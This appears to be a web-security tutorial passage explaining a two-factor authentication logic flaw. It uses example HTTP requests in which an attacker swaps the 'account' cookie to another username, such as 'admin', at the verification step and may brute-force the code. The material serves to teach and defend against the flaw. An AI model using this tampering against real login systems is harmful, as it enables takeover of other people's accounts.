Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.

For example, a user logs in with their credential in the first step as follows:
```http
POST /login-steps/first HTTP/1.1
Host: target-website.com
...
username=carlos&password=1234
```
They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:
```http
HTTP/1.1 200 OK
Set-Cookie: account=carlos
```
```http
GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```
When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:
```http
POST /login-steps/second HTTP/1.1
Host: target-website.com
Cookie: account=carlos
...
verification-code=qwerty
```
In this case, the attacker could login using their own credentials but then change the value of the `account` cookie to any username when submitting the verification code.
```http
POST /login-steps/second HTTP/1.1
Host: target-website.com
Cookie: account=admin
...
verification-code=qwerty
```
This is extremely dangerous if the attacker is then able to brute force the verification code, as it would allow them to login to any user accounts based entirely on their username.